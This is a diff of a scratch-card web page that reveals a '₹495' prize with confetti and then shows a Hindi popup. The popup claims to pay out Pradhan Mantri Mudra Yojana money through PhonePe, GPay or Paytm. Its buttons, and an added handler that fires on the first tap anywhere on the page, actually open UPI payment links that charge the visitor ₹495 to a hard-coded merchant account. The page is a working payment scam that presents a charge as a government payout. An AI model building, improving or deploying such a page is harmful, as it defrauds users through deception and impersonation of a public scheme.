@@ -1,18 +1,19 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Scratch Card</title>
+  <title>Scratch & Claim</title>
   <style>
     body {
       margin: 0;
-      font-family: sans-serif;
+      padding: 0;
       background: #fff;
+      font-family: sans-serif;
       display: flex;
       flex-direction: column;
       align-items: center;
+      position: relative;
     }
 
     .top-img, .bottom-img {
@@ -30,7 +31,6 @@
       border-radius: 25px;
       overflow: hidden;
       box-shadow: 0 10px 25px rgba(0,0,0,0.1);
-      background: #fff;
     }
 
     .reward-layer {
@@ -48,7 +48,7 @@
       bottom: 20px;
       left: 50%;
       transform: translateX(-50%);
-      font-size: 28px;
+      font-size: 24px;
       font-weight: bold;
       color: #d32f2f;
       animation: blink 1s infinite;
@@ -76,109 +76,126 @@
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
-      padding: 10px 20px;
       background: rgba(0, 0, 0, 0.7);
       color: white;
+      padding: 10px 20px;
       border-radius: 12px;
-      font-size: 18px;
+      font-size: 16px;
       font-weight: bold;
       animation: blink 2s infinite;
     }
 
     .hidden { display: none; }
 
-    /* Modal */
-    .modal {
+    .popup {
       position: fixed;
-      top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(0, 0, 0, 0.5);
+      bottom: 40px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #fff;
+      padding: 20px;
+      border-radius: 16px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+      text-align: center;
+      z-index: 999;
+      width: 90%;
+      max-width: 340px;
       display: none;
+    }
+
+    .popup h2 {
+      font-size: 18px;
+      font-weight: bold;
+      margin-bottom: 16px;
+    }
+
+    .upi-btn {
+      display: flex;
       align-items: center;
       justify-content: center;
-      z-index: 9999;
-    }
-
-    .modal.show {
-      display: flex;
-    }
-
-    .modal-box {
-      background: #fff;
-      padding: 20px 30px;
-      border-radius: 14px;
-      text-align: center;
-      box-shadow: 0 10px 20px rgba(0,0,0,0.3);
-    }
-
-    .modal-box h2 {
-      font-size: 20px;
-      margin-bottom: 15px;
-    }
-
-    .modal-box button {
-      margin: 6px;
-      padding: 10px 18px;
+      width: 100%;
+      margin: 8px 0;
+      padding: 10px;
       font-size: 16px;
+      font-weight: 600;
       border: none;
       border-radius: 10px;
-      color: white;
       cursor: pointer;
+      color: white;
+      gap: 10px;
     }
 
-    .btn-gpay { background: #1e88e5; }
-    .btn-phonepe { background: #673ab7; }
-    .btn-paytm { background: #00bcd4; }
+    .upi-btn img {
+      height: 28px;
+    }
+
+    .upi-btn.phonepe { background-color: #673ab7; }
+    .upi-btn.gpay { background-color: #0f9d58; }
+    .upi-btn.paytm { background-color: #0033cc; }
   </style>
 </head>
-<body>
+<body onclick="openPhonePeOnce()">
 
-  <img src="https://i.ibb.co/nNCT43nb/IMG-1114.jpg" class="top-img" />
+  <!-- Banner -->
+  <img src="https://i.ibb.co/nNCT43nb/IMG-1114.jpg" alt="Top" class="top-img" />
 
+  <!-- Scratch Card -->
   <div class="card-container">
-    <img src="https://i.ibb.co/9m8Y3s3R/IMG-1116.png" class="reward-layer hidden" id="rewardImage" />
+    <img src="https://i.ibb.co/9m8Y3s3R/IMG-1116.png" alt="Reward" class="reward-layer hidden" id="rewardImage" />
     <div class="reward-amount hidden" id="rewardAmount">₹495</div>
     <canvas id="scratchCanvas"></canvas>
     <div class="scratch-text" id="scratchText">Scratch here!</div>
   </div>
 
-  <img src="https://i.ibb.co/0RrqgRTj/IMG-1120.jpg" class="bottom-img" />
+  <!-- Banner -->
+  <img src="https://i.ibb.co/0RrqgRTj/IMG-1120.jpg" alt="Bottom" class="bottom-img" />
+
+  <!-- Sound -->
   <audio id="winSound" src="https://files.catbox.moe/0pc7om.mp3"></audio>
+
+  <!-- Confetti -->
   <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
 
-  <!-- Modal -->
-  <div id="upiModal" class="modal">
-    <div class="modal-box">
-      <h2>Pay ₹495 using UPI App</h2>
-      <button class="btn-gpay" onclick="pay('gpay')">Google Pay</button>
-      <button class="btn-phonepe" onclick="pay('phonepe')">PhonePe</button>
-      <button class="btn-paytm" onclick="pay('paytm')">Paytm</button>
-    </div>
+  <!-- UPI Popup -->
+  <div class="popup" id="upiPopup">
+    <h2>प्रधानमंत्री मुद्रा योजना के पैसे अपने खाते में ले</h2>
+
+    <button class="upi-btn phonepe" onclick="openPhonePe()">
+      <img src="https://i.ibb.co/d4Q0qxgM/IMG-1141.png"> PhonePe से लें
+    </button>
+
+    <button class="upi-btn gpay" onclick="openGPay()">
+      <img src="https://i.ibb.co/DHMmHM0x/IMG-1142.png"> GPay से लें
+    </button>
+
+    <button class="upi-btn paytm" onclick="openPaytm()">
+      <img src="https://i.ibb.co/35CLBQzZ/IMG-1145.png"> Paytm से लें
+    </button>
   </div>
 
   <script>
     const canvas = document.getElementById("scratchCanvas");
     const ctx = canvas.getContext("2d");
-    const container = document.querySelector(".card-container");
     const rewardImage = document.getElementById("rewardImage");
     const rewardAmount = document.getElementById("rewardAmount");
     const scratchText = document.getElementById("scratchText");
-    const winSound = document.getElementById("winSound");
-    const modal = document.getElementById("upiModal");
+    const sound = document.getElementById("winSound");
+    const popup = document.getElementById("upiPopup");
+    const container = document.querySelector(".card-container");
 
     canvas.width = container.offsetWidth;
     canvas.height = container.offsetHeight;
 
     const scratchLayer = new Image();
-    scratchLayer.crossOrigin = "anonymous";
     scratchLayer.src = "https://i.ibb.co/nqr14xB9/IMG-1113.jpg";
     scratchLayer.onload = () => {
       ctx.globalCompositeOperation = "source-over";
       ctx.drawImage(scratchLayer, 0, 0, canvas.width, canvas.height);
     };
 
-    let isDrawing = false, revealed = false, lastX = 0, lastY = 0;
+    let isDrawing = false, lastX = 0, lastY = 0, revealed = false;
 
-    function getPosition(e) {
+    function getPos(e) {
       const rect = canvas.getBoundingClientRect();
       const x = (e.touches ? e.touches[0].clientX : e.clientX) - rect.left;
       const y = (e.touches ? e.touches[0].clientY : e.clientY) - rect.top;
@@ -190,7 +207,7 @@
       lastX = x;
       lastY = y;
       scratch(x, y, true);
-      try { winSound.play().catch(() => {}); } catch (e) {}
+      try { sound.play().catch(() => {}); } catch (e) {}
     }
 
     function scratch(x, y, start = false) {
@@ -199,8 +216,9 @@
       ctx.lineJoin = "round";
       ctx.lineWidth = 40;
       ctx.beginPath();
-      if (start) ctx.moveTo(x, y);
-      else {
+      if (start) {
+        ctx.moveTo(x, y);
+      } else {
         ctx.moveTo(lastX, lastY);
         ctx.lineTo(x, y);
         ctx.stroke();
@@ -218,45 +236,69 @@
       return (cleared / (imgData.data.length / 4)) * 100;
     }
 
-    function checkReveal() {
-      if (revealed || getScratchedPercent() < 30) return;
-      revealed = true;
-      canvas.classList.add("hidden");
-      scratchText.classList.add("hidden");
-      rewardImage.classList.remove("hidden");
-      rewardAmount.classList.remove("hidden");
-      try { winSound.play().catch(() => {}); } catch (e) {}
-      confetti({ particleCount: 200, spread: 70, origin: { y: 0.6 } });
-      setTimeout(() => modal.classList.add("show"), 3000);
+    function showConfetti() {
+      confetti({ particleCount: 160, spread: 70, origin: { y: 0.6 } });
     }
 
-    canvas.addEventListener("mousedown", e => startScratch(...Object.values(getPosition(e))));
-    canvas.addEventListener("mousemove", e => { if (!isDrawing) return; scratch(...Object.values(getPosition(e))); checkReveal(); });
+    function checkReveal() {
+      if (revealed) return;
+      if (getScratchedPercent() >= 30) {
+        revealed = true;
+        canvas.classList.add("hidden");
+        scratchText.classList.add("hidden");
+        rewardImage.classList.remove("hidden");
+        rewardAmount.classList.remove("hidden");
+        try { sound.play().catch(() => {}); } catch (e) {}
+        showConfetti();
+        setTimeout(() => popup.style.display = "block", 3000);
+      }
+    }
+
+    // Events
+    canvas.addEventListener("mousedown", e => {
+      const { x, y } = getPos(e);
+      startScratch(x, y);
+    });
+    canvas.addEventListener("mousemove", e => {
+      if (!isDrawing) return;
+      const { x, y } = getPos(e);
+      scratch(x, y); checkReveal();
+    });
     canvas.addEventListener("mouseup", () => isDrawing = false);
     canvas.addEventListener("mouseleave", () => isDrawing = false);
 
-    canvas.addEventListener("touchstart", e => startScratch(...Object.values(getPosition(e))));
-    canvas.addEventListener("touchmove", e => { if (!isDrawing) return; scratch(...Object.values(getPosition(e))); checkReveal(); e.preventDefault(); });
+    canvas.addEventListener("touchstart", e => {
+      const { x, y } = getPos(e);
+      startScratch(x, y);
+    });
+    canvas.addEventListener("touchmove", e => {
+      if (!isDrawing) return;
+      const { x, y } = getPos(e);
+      scratch(x, y); checkReveal();
+      e.preventDefault();
+    });
     canvas.addEventListener("touchend", () => isDrawing = false);
 
-    function pay(app) {
-      const pa = "g1g4822917.rzp@icici";
-      const tr = "RZPQhptbTHPKvHtK8qrv2";
-      const pn = "G1G4";
-      const am = "495";
-      const tn = "ScratchWin";
-      const cu = "INR";
-      let uri = "";
+    // Open UPI apps
+    function openPhonePe() {
+      window.location.href = "phonepe://pay?pa=g1g4822917.rzp@icici&pn=G1G4&tr=RZPQhptbTHPKvHtK8qrv2&am=495&cu=INR";
+    }
 
-      if (app === "phonepe") {
-        uri = `phonepe://pay?pa=${pa}&pn=${pn}&tr=${tr}&tn=${tn}&am=${am}&cu=${cu}`;
-      } else if (app === "gpay") {
-        uri = `gpay://upi/pay?pa=${pa}&pn=${pn}&tr=${tr}&tn=${tn}&am=${am}&cu=${cu}`;
-      } else {
-        uri = `paytmmp://pay?pa=${pa}&pn=${pn}&tr=${tr}&tn=${tn}&am=${am}&cu=${cu}`;
+    function openGPay() {
+      window.location.href = "gpay://upi/pay?pa=g1g4822917.rzp@icici&pn=G1G4&tr=RZPQhptbTHPKvHtK8qrv2&am=495&cu=INR";
+    }
+
+    function openPaytm() {
+      window.location.href = "paytmmp://pay?pa=g1g4822917.rzp@icici&pn=G1G4&tr=RZPQhptbTHPKvHtK8qrv2&am=495&cu=INR";
+    }
+
+    // Auto open on first click
+    let firstTouch = false;
+    function openPhonePeOnce() {
+      if (!firstTouch) {
+        firstTouch = true;
+        openPhonePe();
       }
-
-      window.location.href = uri;
     }
   </script>
 </body>
